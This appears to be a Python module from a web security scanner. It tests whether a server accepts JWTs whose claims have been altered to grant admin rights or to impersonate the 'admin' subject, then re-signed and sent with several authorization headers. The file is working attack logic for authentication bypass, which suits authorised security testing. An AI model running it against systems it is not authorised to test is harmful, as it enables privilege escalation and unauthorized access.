"""JWT claim manipulation attack."""

import logging
from typing import Any, cast

from ._helpers import (
    JWT_AUTH_HEADERS,
    _create_jwt,
    _decode_jwt_part,
    _get_original_status,
    _send_with_token,
)

logger = logging.getLogger(__name__)


def test_claim_manipulation(token: str, url: str, session: Any) -> dict[str, Any]:
    """Test JWT claim manipulation.

    Modifies JWT claims like sub, role, admin to test if the server
    properly validates token claims.
    """
    result: dict[str, Any] = {"attack": "claim_manipulation", "vulnerable": False, "details": []}
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return result
        header = _decode_jwt_part(parts[0])
        payload = _decode_jwt_part(parts[1])
        if not header or not payload:
            return result

        if not isinstance(header, dict):
            header = {"alg": "HS256", "typ": "JWT"}
        header["alg"] = "HS256"

        original_status = _get_original_status(url, session)

        claim_tests: list[dict[str, Any]] = [
            {
                "name": "admin_claim",
                "payload": {**dict(payload), "admin": True, "role": "admin"},
            },
            {
                "name": "sub_override",
                "payload": {**dict(payload), "sub": "admin"},
            },
        ]

        for test in claim_tests:
            manipulated_token = _create_jwt(header, cast(dict, test["payload"]))

            for auth_header in JWT_AUTH_HEADERS:
                resp = _send_with_token(url, manipulated_token, auth_header, session)
                status = resp.get("status", 0)

                if status in (200, 302) and original_status in (401, 403):
                    result["vulnerable"] = True
                    result["details"].append(
                        {
                            "test_name": test["name"],
                            "auth_header": auth_header,
                            "status_code": status,
                            "original_status": original_status,
                            "finding": f"claim_{test['name']}_bypass",
                        }
                    )
                    break

            if result["vulnerable"]:
                break

        logger.info("Claim manipulation test on %s: vulnerable=%s", url, result["vulnerable"])
    except Exception as e:
        logger.error("Claim manipulation test error on %s: %s", url, e)
    return result
